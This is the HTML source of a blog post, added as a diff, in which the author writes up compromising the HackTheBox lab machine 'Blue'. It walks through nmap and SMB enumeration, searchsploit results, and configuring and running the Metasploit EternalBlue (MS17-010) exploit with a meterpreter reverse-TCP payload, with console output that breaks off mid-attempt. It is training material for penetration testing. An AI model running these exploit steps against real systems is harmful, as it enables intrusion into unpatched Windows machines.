@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8">
+  <title>Blue HackTheBox - Write-Up</title>
+
+  <!-- mobile responsive meta -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Rooting the Blue box from HackTheBox - a writeup by Chapl1n">
+  <meta name="author" content="See the description ...">
+  <meta name="generator" content="Hugo 0.71.0" />
+
+  <!-- plugins -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/bootstrap/bootstrap.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/Ionicons/css/ionicons.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/magnific-popup/magnific-popup.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/slick/slick.css">
+  
+
+  <!-- Main Stylesheet -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/scss/style.min.css" media="screen">
+
+  <!--Favicon-->
+  <link rel="shortcut icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+
+</head><body>
+<!-- preloader start -->
+<div class="preloader">
+  
+</div>
+<!-- preloader end -->
+
+<header class="navigation">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        
+        <nav class="navbar">
+          
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navigation">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">
+              <img src="http://192.168.1.191/images/home.jpeg" alt="Chapl1n" class="img-responsive">
+            </a>
+          </div>
+          
+          <div class="collapse navbar-collapse" id="navigation">
+            <ul class="nav navbar-nav navbar-right">
+              <li><a href="http://192.168.1.191">Home</a></li>
+
+              
+              
+              <li><a href="http://192.168.1.191/about">About</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/project">Projects</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/blog">Blog</a></li>
+              
+              
+              
+              <li><a href="https://twitter.com/MrChapl1n">Twitter</a></li>
+              
+              
+
+              
+
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section class="page-title bg-2" style="background-image: url('http://192.168.1.191/images/featue-bg.jpg');">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="block">
+          <h1>Blue HackTheBox - Write-Up</h1>
+          <p>Rooting the Blue box from HackTheBox - a writeup by Chapl1n</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="page-wrapper">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-8">
+				<div class="post post-single">
+					<h2 class="post-title">Blue HackTheBox - Write-Up</h2>
+					<div class="post-meta">
+						<ul>
+              <li><i class="ion-calendar"></i> July 11, 2020</li>
+              <li><i class="ion-android-people"></i>
+                Posted By
+                
+                <a class="text-primary" href="/author/chapl1n">Chapl1n</a>
+                
+              </li>
+              <li><i class="ion-pricetags"></i> 
+                
+                <a href="/tags/hackthebox">Hack the box</a>
+								
+                , <a href="/tags/windows">Windows</a>
+								
+                , <a href="/tags/smb">Smb</a>
+								
+                , <a href="/tags/eternalblue">Eternal blue</a>
+								
+                , <a href="/tags/tty%20shell">Tty shell</a>
+								
+                , <a href="/tags/exploit%20modification">Exploit modification</a>
+								
+              </li>
+            </ul>
+					</div>
+					<div class="post-thumb">
+						<img class="img-responsive" src="/images/blog/blue/cover.jpg" alt="Blue HackTheBox - Write-Up">
+					</div>
+					<div class="post-content post-excerpt">
+						<p>This blog piece details my approach for pwning the HackTheBox machine called <code>Blue</code>. As per usual for my HackTheBox writeups, I will try to pwn Blue with and without Metasploit.</p>
+<h1 id="section-1---with-metasploit"><strong>Section 1 - With Metasploit</strong></h1>
+<hr>
+<h1 id="reconnaissance"><strong>Reconnaissance</strong></h1>
+<h3 id="step-1---intital-nmap-scan">Step 1 - Intital nmap scan</h3>
+<p>To start, nmap is used to scan for open TCP ports and identify the services running on Blue. For a description of the specific switches used, take a look at my first article <a href="/blog/legacy/"><strong>Legacy</strong></a>.</p>
+<pre><code>student@teacher:~/hackthebox/Blue$ nmap -T4 -Pn -n --min-rate=1000 --max-rate=5000 -p- --open 10.10.10.40
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 11:26 BST
+Nmap scan report for 10.10.10.40
+Host is up (0.080s latency).
+Not shown: 62521 closed ports, 3005 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 16.20 seconds
+</code></pre><p>I suspected before doing this scan that SMB is a likely service running in Blue as the name is a reference to <code>MS17-010</code> (aka EternalBlue), a vulnerbaility in SMB version 1. The results show that TCP ports <code>139</code> and <code>445</code> are open - these are consistently used for SMB servers. Port 135 was also open and used a service called <code>MSRPC</code> which I am unaware of. After a bit of research I found out that MSRPC stands for <a href="https://en.wikipedia.org/wiki/Microsoft_RPC"><code>Remote Procedure Call</code></a>, a protocol developed by Microsoft that allows for programs on one computer to request a service from another computer without having to understand its network details.</p>
+<h3 id="step-2---aggressive-nmap-scan">Step 2 - Aggressive nmap scan</h3>
+<p>An aggressive nmap scan will now be done for the open TCP ports to provide me with detailed information related to the system.</p>
+<pre><code>student@teacher:~/hackthebox/Blue$ nmap -T4 -Pn -n -p 135,139,445,49152,49153,49154,49155,49156,49157 -A -oA tcp_Aggressive_Blue_Scan 10.10.10.40
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 10:00 BST
+Nmap scan report for 10.10.10.40
+Host is up (0.063s latency).
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -15m13s, deviation: 34m36s, median: 4m45s
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-07-06T10:06:02+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-07-06T09:06:03
+|_  start_date: 2020-07-06T08:52:24
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.49 seconds
+</code></pre><p>There are several pieces of information that are of interest to me, but what stands out the most for me is that from the reported <code>smb-os-discovery</code> info, Blue is running <code>Service Pack 1</code>. This version has been known to have the EternalBlue vulnerability.</p>
+<h1 id="enumeration"><strong>Enumeration</strong></h1>
+<h3 id="step-1---accessing-smb-server-with-smbclient">Step 1 - Accessing SMB server with smbclient</h3>
+<p>Since there is an SMB server present on Blue, I will try to access its file shares with the <code>smbclient</code> tool.</p>
+<pre><code>student@teacher:~/hackthebox/Blue$ smbclient -L //10.10.10.40
+Enter WORKGROUP\student's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Share           Disk      
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre><p>The connection failed but I am able to see several file shares. I will try to access the <code>ADMIN$</code> file share as it could possibly contain sensitive information.</p>
+<pre><code>student@teacher:~/hackthebox/Blue$ smbclient -L ////10.10.10.40//ADMIN$
+Enter WORKGROUP\student's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Share           Disk      
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre><p>I am not able to access the ADMIN$ file share, so hopefully using the tool <code>enum4linux</code> will provide me more information.</p>
+<h3 id="step-2---enumerate-smb-server-with-enum4linux">Step 2 - Enumerate SMB server with enum4linux</h3>
+<pre><code>student@teacher:~/hackthebox/Blue$ enum4linux 10.10.10.40
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul  6 10:54:31 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.10.40
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ =================================================== 
+|    Enumerating Workgroup/Domain on 10.10.10.40    |
+ =================================================== 
+[E] Can't find workgroup/domain
+
+
+ =========================================== 
+|    Nbtstat Information for 10.10.10.40    |
+ =========================================== 
+Looking up status of 10.10.10.40
+No reply from 10.10.10.40
+
+ ==================================== 
+|    Session Check on 10.10.10.40    |
+ ==================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
+[+] Server 10.10.10.40 allows sessions using username '', password ''
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
+[+] Got domain/workgroup name: 
+
+ ========================================== 
+|    Getting domain SID for 10.10.10.40    |
+ ========================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
+could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
+could not obtain sid from server
+error: NT_STATUS_ACCESS_DENIED
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ===================================== 
+|    OS information on 10.10.10.40    |
+ ===================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 10.10.10.40 from smbclient: 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
+[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED
+
+ ============================ 
+|    Users on 10.10.10.40    |
+ ============================ 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ======================================== 
+|    Share Enumeration on 10.10.10.40    |
+ ======================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
+do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.10.40
+
+ =================================================== 
+|    Password Policy Information for 10.10.10.40    |
+ =================================================== 
+[E] Unexpected error from polenum:
+
+
+[+] Attaching to 10.10.10.40 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: Cannot request session (Called Name:10.10.10.40)
+
+[+] Trying protocol 445/SMB...
+
+        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
+
+[E] Failed to get password policy with rpcclient
+
+
+ ============================= 
+|    Groups on 10.10.10.40    |
+ ============================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting builtin groups:
+[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting builtin group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting local groups:
+[E] Can't get local groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting local group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
+
+[+] Getting domain groups:
+[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting domain group memberships:
+
+ ====================================================================== 
+|    Users on 10.10.10.40 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ====================================================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
+
+ ============================================ 
+|    Getting printer info for 10.10.10.40    |
+ ============================================ 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
+could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
+could not obtain sid from server
+error: NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Mon Jul  6 10:54:59 2020
+</code></pre><p>Enum4linux did not return much information besides a list of usernames for accessing the SMB server. I will go back to enumerating the different services running on Blue. The first thing I will do is use <code>searchsploit</code> to find potential exploits that match the information I have.</p>
+<h3 id="step-3---determining-potential-exploits-with-searchsploit">Step 3 - Determining potential exploits with Searchsploit</h3>
+<p>Blue is a Windows 7 machine that is running SMB v1, so I start with that.</p>
+<h3 id="step-31---smb-server">Step 3.1 - SMB server</h3>
+<pre><code>student@teacher:~/hackthebox/Blue$ searchsploit Microsoft Windows 7 SMB
+------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                 |  Path
+------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Microsoft - SMB Server Trans2 Zero Size Pool Alloc (MS10-054)                                                                  | windows/dos/14607.py
+Microsoft DNS RPC Service - 'extractQuotedChar()' Remote Overflow 'SMB' (MS07-029) (Metasploit)                                | windows/remote/16366.rb
+Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)      | windows/remote/43970.rb
+Microsoft Windows - 'SMBGhost' Remote Code Execution                                                                           | windows/remote/48537.py
+Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050)                                   | windows/remote/14674.txt
+Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050) (Metasploit)                      | windows/remote/16363.rb
+Microsoft Windows - LSASS SMB NTLM Exchange Null-Pointer Dereference (MS16-137)                                                | windows/dos/40744.txt
+Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                                  | windows/dos/41891.rb
+Microsoft Windows - SMB2 Negotiate Protocol '0x72' Response Denial of Service                                                  | windows/dos/12524.py
+Microsoft Windows - SmbRelay3 NTLM Replay (MS08-068)                                                                           | windows/remote/7125.txt
+Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Local Privilege Escalation              | windows/local/48267.txt
+Microsoft Windows 10 - SMBv3 Tree Connect (PoC)                                                                                | windows/dos/41222.py
+Microsoft Windows 10.0.17134.648 - HTTP -&gt; SMB NTLM Reflection Leads to Privilege Elevation                                    | windows/local/47115.txt
+Microsoft Windows 2003 SP2 - 'ERRATICGOPHER' SMB Remote Code Execution                                                         | windows/remote/41929.py
+Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                               | windows/remote/42031.py
+Microsoft Windows 7/2008 R2 - SMB Client Trans2 Stack Overflow (MS10-020) (PoC)                                                | windows/dos/12273.py
+Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                           | windows/remote/42315.py
+Microsoft Windows 8.1/2012 R2 - SMBv3 Null Pointer Dereference Denial of Service                                               | windows/dos/44189.py
+Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                     | windows_x86-64/remote/42030.py
+Microsoft Windows 95/Windows for Workgroups - 'smbclient' Directory Traversal                                                  | windows/remote/20371.txt
+Microsoft Windows NT 4.0 SP5 / Terminal Server 4.0 - 'Pass the Hash' with Modified SMB Client                                  | windows/remote/19197.txt
+Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                  | windows_x86-64/remote/41987.py
+Microsoft Windows SMB Server (v1/v2) - Mount Point Arbitrary Device Open Privilege Escalation                                  | windows/dos/43517.txt
+Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen of Death (MS07-063)                           | windows/dos/9594.txt
+Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (1)                                      | windows/dos/21746.c
+Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (2)                                      | windows/dos/21747.txt
+------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>A lot of results came back, and as suspected, <code>EternalBlue</code> was one of them. EternalBlue is an SMB v1 exploit, that enables remote code execution (RCE) attack capabilities.</p>
+<h3 id="step-32---rpc">Step 3.2 - RPC</h3>
+<p>I know EternalBlue is highly likely to help pwn Blue, but I am still curious as to what RPC exploits may be available.</p>
+<pre><code>student@teacher:~/hackthebox/Blue$ searchsploit Microsoft Windows 7 RPC
+------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                 |  Path
+------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Microsoft DNS RPC Service - 'extractQuotedChar()' Remote Overflow 'SMB' (MS07-029) (Metasploit)                                | windows/remote/16366.rb
+Microsoft DNS RPC Service - 'extractQuotedChar()' TCP Overflow (MS07-029) (Metasploit)                                         | windows/remote/16748.rb
+Microsoft RPC DCOM Interface - Remote Overflow (MS03-026) (Metasploit)                                                         | windows/remote/16749.rb
+Microsoft Windows - 'RPC DCOM' Remote (1)                                                                                      | windows/remote/69.c
+Microsoft Windows - 'RPC DCOM' Remote (2)                                                                                      | windows/remote/70.c
+Microsoft Windows - 'RPC DCOM' Remote (Universal)                                                                              | windows/remote/76.c
+Microsoft Windows - 'RPC DCOM' Remote Buffer Overflow                                                                          | windows/remote/64.c
+Microsoft Windows - 'RPC DCOM' Scanner (MS03-039)                                                                              | windows/remote/97.c
+Microsoft Windows - DCE-RPC svcctl ChangeServiceConfig2A() Memory Corruption                                                   | windows/dos/3453.py
+Microsoft Windows - DCOM RPC Interface Buffer Overrun                                                                          | windows/remote/22917.txt
+Microsoft Windows - DNS RPC Remote Buffer Overflow (2)                                                                         | windows/remote/3746.txt
+Microsoft Windows 10 1903/1809 - RPCSS Activation Kernel Security Callback Privilege Escalation                                | windows/local/47135.txt
+Microsoft Windows 8.1 - DCOM DCE/RPC Local NTLM Reflection Privilege Escalation (MS15-076)                                     | windows/local/37768.txt
+Microsoft Windows Message Queuing Service - RPC Buffer Overflow (MS07-065) (1)                                                 | windows/remote/4745.cpp
+Microsoft Windows Message Queuing Service - RPC Buffer Overflow (MS07-065) (2)                                                 | windows/remote/4934.c
+Microsoft Windows Server 2000 - RPC DCOM Interface Denial of Service                                                           | windows/dos/61.c
+Microsoft Windows Server 2000 SP4 - DNS RPC Remote Buffer Overflow                                                             | windows/remote/3737.py
+Microsoft Windows XP/2000 - 'RPC DCOM' Remote (MS03-026)                                                                       | windows/remote/66.c
+Microsoft Windows XP/2000 - RPC Remote Non Exec Memory                                                                         | windows/remote/117.c
+Microsoft Windows XP/2000/NT 4.0 - RPC Service Denial of Service (3)                                                           | windows/dos/21953.txt
+------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>There are in fact mulitple exploits for RPC, with many Metasploit modules related to it.<br>
+<strong>Note</strong>: I spent a large portion of time trying to use exploits for RPC to get a shell with Blue and was not getting any success with it. In reality, Blue was meant to be pwned with EternalBlue hence the name. It has motivated me to develop skills to recognise any potential rabbit holes that I need to avoid and not waste any time on.</p>
+<h1 id="exploitation"><strong>Exploitation</strong></h1>
+<h3 id="step-1---getting-eternalblue-metasploit-module">Step 1 - Getting EternalBlue Metasploit module</h3>
+<p>I load up Metasploit with <code>msfconsole</code> and search for exploit modules related to EternalBlue.</p>
+<pre><code>msf5 &gt; search eternalblue
+
+Matching Modules
+================
+
+#  Name                                           Disclosure Date  Rank     Check  Description
+-  ----                                           ---------------  ----     -----  -----------
+0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 
+5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+</code></pre><p>There are five results from this search and I start by ignoring modules 0 and 1 as they are auxiliary modules - i.e. they are typically scanning and not exploitation based. Auxilliary modules are commonly used during the enumeration phase of a pen test. Of the remaining modules, I will select 2 because 3 applies to Windows 8 and Blue is Windows 7. Result 4 references a Microsoft tool called PsExec which I am unsure about; and I am unfamiliar with doublepulsar for result 5. Let&rsquo;s work with what I know first!</p>
+<pre><code>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt;  
+</code></pre><p>The module has been loaded and since a payload wasn&rsquo;t specified, a meterpreter one is used by default.</p>
+<h3 id="step-2---configuring-metasploit-module-and-payload">Step 2 - Configuring Metasploit module and payload</h3>
+<p>The module and payload now need to be configured to target Blue.</p>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.186    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+</code></pre><p>I don&rsquo;t need to change the <code>RPORT</code> value (<code>445</code>) as it&rsquo;s preset to the default port used by Blue for SMB. I need to set the <code>RHOSTS</code> value to the IP address of Blue.</p>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40
+RHOSTS =&gt; 10.10.10.40
+</code></pre><p>I set the <code>LHOST</code> value to my local IP address.</p>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.16.195
+LHOST =&gt; 10.10.16.195
+</code></pre><p>I check the module and payload configuration options again to ensure that they&rsquo;ve been set appropriately.</p>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.10.10.40      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.16.195     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+</code></pre><p>Everything looks good, so the module is run.</p>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run
+
+[*] Started reverse TCP handler on 10.10.16.195:4444 
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.40:445 - Starting non-paged pool grooming
+[+] 10.10.10.40:445 - Sending SMBv2 buffers
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.40:445 - Receiving response from exploit packet
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.40:445 - Trying exploit with 17 Groom Allocations.
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.40:445 - Starting non-paged pool grooming
+[+] 10.10.10.40:445 - Sending SMBv2 buffers
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
